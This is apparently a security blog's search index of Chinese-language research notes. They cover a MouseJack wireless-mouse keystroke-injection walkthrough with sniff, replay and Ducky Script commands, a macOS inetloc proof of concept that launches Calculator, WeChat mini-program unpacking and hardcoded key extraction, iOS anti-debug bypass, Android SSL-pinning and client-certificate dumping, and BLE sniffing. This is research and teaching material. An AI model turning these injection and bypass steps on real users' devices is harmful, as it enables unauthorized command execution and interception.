<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Crazyradio PA---罗技 鼠标劫持</title>
    <url>/2021/09/24/Crazyradio%20PA---%E7%BD%97%E6%8A%80%20%E9%BC%A0%E6%A0%87%E5%8A%AB%E6%8C%81/</url>
    <content><![CDATA[<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>  <a href="https://www.bettercap.org/modules/hid/">https://www.bettercap.org/modules/hid/</a><br>  <a href="https://github.com/BastilleResearch/nrf-research-firmware">https://github.com/BastilleResearch/nrf-research-firmware</a><br>  <a href="https://github.com/hak5darren">https://github.com/hak5darren</a></p>
<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><pre><code>Atiify
Crazyradio PA
Logitech M186
使用攻击脚本：https://github.com/BastilleResearch/mousejack
            原：https://github.com/RFStorm/
bettercap也可以不使用，但使用hid模块，通过数据传输总量有助于准确找出鼠标地址
</code></pre>
<h1 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h1><p>  apt install sdcc binutils<br>  pip install pyusb<br>  pip install platformio</p>
<h1 id="烧录（也可跳过，烧录需要usb2-0的接口）"><a href="#烧录（也可跳过，烧录需要usb2-0的接口）" class="headerlink" title="烧录（也可跳过，烧录需要usb2.0的接口）"></a>烧录（也可跳过，烧录需要usb2.0的接口）</h1><p>  git clone <a href="https://github.com/bitcraze/crazyradio-firmware">https://github.com/bitcraze/crazyradio-firmware</a><br>  cd crazyradio-firmware<br>  python usbtools/launchBootloader.py</p>
<span id="more"></span>    
<p>  下载固件<br>  <a href="https://github.com/bitcraze/crazyradio-firmware/releases">https://github.com/bitcraze/crazyradio-firmware/releases</a><br>  python usbtools/nrfbootload.py flash cradio-0.53.bin</p>
<p>  lsusb命令查看<br>  id为1915:0101 或 1915:0102</p>
<h1 id="mousejack"><a href="#mousejack" class="headerlink" title="mousejack"></a>mousejack</h1><p>  mousejack扩展工具：<a href="https://github.com/iamckn/mousejack_transmit">https://github.com/iamckn/mousejack_transmit</a></p>
<p>  cd nrf-research-firmware/tools<br>  搜索<br>  移动鼠标发现地址<br>  sudo python nrf24-scanner.py</p>
<p>  对特定地址进行嗅探<br>  capture.log 为固定输出文件名 </p>
<p>  sudo ./nrf24-sniffer.py -a 0D:6C:90:B4:A4 -o capture.log<br>  sudo ./nrf24-static-channel-replay -a 0D:6C:90:B4:A4</p>
<p>  即可重放log里的数据</p>
<h1 id="远程执行命令"><a href="#远程执行命令" class="headerlink" title="远程执行命令"></a>远程执行命令</h1><p>  duck.txt编写<br>  调用terminal 执行whoami<br>  参考链接：<a href="https://docs.hak5.org/hc/en-us/articles/360010555153-Ducky-Script-the-USB-Rubber-Ducky-language">https://docs.hak5.org/hc/en-us/articles/360010555153-Ducky-Script-the-USB-Rubber-Ducky-language</a><br>  <a href="https://docs.hak5.org/hc/en-us/articles/360010471254-The-USB-Rubber-Ducky-Workflow">https://docs.hak5.org/hc/en-us/articles/360010471254-The-USB-Rubber-Ducky-Workflow</a><br>对于mac：<br>  GUI SPACE<br>  DELAY 1000<br>  STRING Terminal<br>  DELAY 2000<br>  ENTER<br>  DELAY 1000<br>  STRING  whoami<br>  DELAY 1000<br>  ENTER<br>  ESC<br>利用bettercap进行注入<br>hid.recon on 开启 crazy<br>hid.inject 0d:6c:90:b4:a4 US /home/iot/Desktop/mouse/mousejack_transmit/duck.txt<br>  <img src="/images/mouse/b1.png" alt="bettercap"></p>
<p><img src="/images/mouse/b2.png" alt="调用termnial"></p>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
  </entry>
  <entry>
    <title>MacOS 2021-9-21 inetloc复现</title>
    <url>/2021/09/22/macos%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="big-sur-lt-11-2-3-20D91）"><a href="#big-sur-lt-11-2-3-20D91）" class="headerlink" title="big sur&lt;=11.2.3 (20D91）"></a>big sur&lt;=11.2.3 (20D91）</h1><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><pre><code>保存为hello.inetloc
</code></pre>
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
  <dict>
    <key>URL</key>
    <string>FiLe:////////////////////////System/Applications/Calculator.app</string>
  </dict>
</plist>

<span id="more"></span>    
<p>双击执行</p>
<p><img src="/images/cal.jpg" alt="计算器"></p>
]]></content>
      <categories>
        <category>MacOS</category>
      </categories>
  </entry>
  <entry>
    <title>小程序安全测试--微信（1）</title>
    <url>/2021/09/03/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<h1 id="工具列表"><a href="#工具列表" class="headerlink" title="工具列表"></a>工具列表</h1><pre><code>注：因为小程序鹅厂有自己的一套加密服务，如果小程序购买了这个服务，反编译不一定能成功
</code></pre>
<span id="more"></span>    

<p>app端解包<br>python (<a href="https://github.com/leo9960/wechat-app-unpack">https://github.com/leo9960/wechat-app-unpack</a>)<br>nodejs 也有编译好的客户端 (<a href="https://github.com/xuedingmiaojun/mp-unpack">https://github.com/xuedingmiaojun/mp-unpack</a>)</p>
<p>pc端解包<br>pc端可能带加密，所以需要先转码<br>(<a href="https://github.com/maotoumao/wxpc-miniprogram-decryption">https://github.com/maotoumao/wxpc-miniprogram-decryption</a>)<br>原理：<br>(<a href="https://juejin.cn/post/6888348237242040327">https://juejin.cn/post/6888348237242040327</a>)<br>(<a href="https://github.com/BlackTrace/pc_wxapkg_decrypt">https://github.com/BlackTrace/pc_wxapkg_decrypt</a>)</p>
<h1 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h1><p>Android：<br>/data/data/com.tencent.mm/MicroMsg/32位长文件/appbrand/pkg</p>
<p>IOS：<br>/var/mobile/Containers/Data/Application/{程序UUID}/Library/WechatPrivate/{用户ID}/WeApp/LocalCache/release/{小程序ID}/</p>
<p>mac路径：</p>
<p>~/Library/Group Containers/5A4RE8SF68.com.tencent.xinWeChat/Library/Caches/xinWeChat/817f39087ae1fbf97dc81798419249c7/WeApp/LocalCache/release/wx3ba512d53df66a75/4/Module<br><img src="/images/mac%E8%B7%AF%E5%BE%84.png"></p>
<p>以某球影城为例：<br>从Android复制过来4个包，一个主文件，三个子文件<br><img src="/images/%E8%A7%A3%E5%8C%85.jpg"></p>
<p>案列一：<br>某小程序硬编码<br>aes 偏移量 密钥<br><img src="/images/phc/phc.jpg" alt="aes 偏移量 密钥"></p>
<p>解密数据包<br>修改数据即可测试。<br><img src="/images/phc/phc2.jpg" alt="解密数据包"></p>
]]></content>
      <categories>
        <category>小程序</category>
      </categories>
  </entry>
  <entry>
    <title>IOS—lldb基础调试</title>
    <url>/2021/10/03/IOS-lldb%E5%9F%BA%E7%A1%80%E8%B0%83%E8%AF%95/</url>
    <content><![CDATA[<h1 id="越狱手机"><a href="#越狱手机" class="headerlink" title="越狱手机"></a>越狱手机</h1><p>ps -ef | grep 进程</p>
<p>获得路径 /var/……</p>
<p>debugserver -x backboard 0.0.0.0:1234  /var/……</p>
<h1 id="mac"><a href="#mac" class="headerlink" title="mac"></a>mac</h1><p>lldb<br>进入</p>
<span id="more"></span>  
<p>process connect connect：//IP：port<br>b ptrace<br>c<br>p $x0<br>打印应该是30</p>
<p>register write $x0 10</p>
<p>绕过反调试<br>防止程序退出</p>
<h1 id="获取地址"><a href="#获取地址" class="headerlink" title="获取地址"></a>获取地址</h1><p>Class-dump 头文件</p>
<p><img src="/images/ios-lldb/1.png" alt="class-dump"></p>
<p>点开 选getsessionid 进行测试<br><img src="/images/ios-lldb/2.png"></p>
<h1 id="获取基地址"><a href="#获取基地址" class="headerlink" title="获取基地址"></a>获取基地址</h1><p>ida 打开 解压后的ipa包中的可执行文件</p>
<p><img src="/images/ios-lldb/3.png" alt="获取基地址"></p>
<h1 id="获取当前地址"><a href="#获取当前地址" class="headerlink" title="获取当前地址"></a>获取当前地址</h1><p>lldb 里 输入 imge list -o -f “进程名”<br><img src="/images/ios-lldb/4.png" alt="获取当前地址"></p>
<h1 id="获取寄存器数值"><a href="#获取寄存器数值" class="headerlink" title="获取寄存器数值"></a>获取寄存器数值</h1><p>在登录处设置断点<br>breakpoint s -a 0x000000000064c000+0000000100857320</p>
<p><img src="/images/ios-lldb/5.png" alt="断点打印"></p>
<p>打印寄存器<br>出数据<br><img src="/images/ios-lldb/6.png" alt="断点打印"></p>
]]></content>
      <categories>
        <category>IOS</category>
      </categories>
  </entry>
  <entry>
    <title>某蜂app抓包分析</title>
    <url>/2021/10/10/%E6%9F%90%E8%9C%82app%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>尝试解除flutter<br>hook java sll<br>内存dump双向认证证书<br>导入burp抓包测试</p>
<p>1.flutter<br>参考：<a href="https://bbs.pediy.com/thread-261941.htm">https://bbs.pediy.com/thread-261941.htm</a></p>
<p>apk解压后发现flutter的so文件<br>以为是flutter问题<br>找到字节进行hook（ida–&gt;ssl_client–&gt;x–&gt;取字节 ）</p>
<p>2.java-ssl绕过<br>root手机配置好后进行抓包，发现不能抓<br>hook java-ssl<br>登录页面发包403显示 证书未发送</p>
<p>3.双向认证<br>除了自己写<br>可以用工具hooker<br><a href="https://github.com/CreditTone/hooker">https://github.com/CreditTone/hooker</a><br>客户端必调java.security.KeyStore的getPrivateKey和getCertificate方法<br>hook dump证书，密码写入<br>导入 burp </p>
<p>抓包发现逻辑漏洞。 </p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
  </entry>
  <entry>
    <title>Ble抓包1</title>
    <url>/2021/08/22/%E8%93%9D%E7%89%99%E6%8A%93%E5%8C%851/</url>
    <content><![CDATA[<h1 id="1-安装环境"><a href="#1-安装环境" class="headerlink" title="1.安装环境"></a>1.安装环境</h1><p>本次用的windows……</p>
<p>wireshark  可用最新版本<br>nrf 板子 的wireshark 插件<br>驱动下载：<a href="https://www.silabs.com/products/development-tools/software/usb-to-uart-bridge-vcp-drivers">https://www.silabs.com/products/development-tools/software/usb-to-uart-bridge-vcp-drivers</a><br>v3 需要python3</p>
<p>v2需要python2</p>
<p><a href="https://www.nordicsemi.com/Software-and-Tools/Development-Tools/nRF-Sniffer-for-Bluetooth-LE/Download#infotabs">https://www.nordicsemi.com/Software-and-Tools/Development-Tools/nRF-Sniffer-for-Bluetooth-LE/Download#infotabs</a></p>
<p>如下都使用的是 V3 示例</p>
<h1 id="2-配置"><a href="#2-配置" class="headerlink" title="2.配置"></a>2.配置</h1><p>nrf 板子解压后<br>重点关注以下文件<br><img src="/images/BLE/jieya.png" alt="解压">   </p>
<p>将 extcap 里面的文件移动到 wireshark 的extcap 下<br><img src="/images/BLE/2.png"></p>
<p>将Profile_nRF_Sniffer_Bluetooth_LE 移到 wireshark 的profiles 下<br><img src="/images/BLE/3.png"></p>
<h1 id="3-python-配置"><a href="#3-python-配置" class="headerlink" title="3.python 配置"></a>3.python 配置</h1><p>安装依赖：python3 -m pip install -r requirements.txt </p>
<p>在extcap 中 执行 nrf_sniffer_ble.bat 不报错</p>
<p>即可</p>
<p><img src="/images/BLE/4.png"></p>
<p>注意 如果报错 ：python3 找不到</p>
<p>需修改输入 python时 显示 为 python3</p>
<p>如图</p>
<p><img src="/images/BLE/5.png"></p>
<h1 id="4-插上板子-启动-wireshark"><a href="#4-插上板子-启动-wireshark" class="headerlink" title="4.插上板子 启动 wireshark"></a>4.插上板子 启动 wireshark</h1><p>即可看到 nrf sniffer的 接口 </p>
<p>双击即可抓包</p>
<p><img src="/images/BLE/6.png"></p>
<h1 id="5-抓包"><a href="#5-抓包" class="headerlink" title="5.抓包"></a>5.抓包</h1><p>多连接几次，才可能抓到 连接包  协议为 ATT<br><img src="/images/BLE/7.png"></p>
<p>防重放攻击方式： 假如时间戳，其他字段等</p>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
  </entry>
</search>
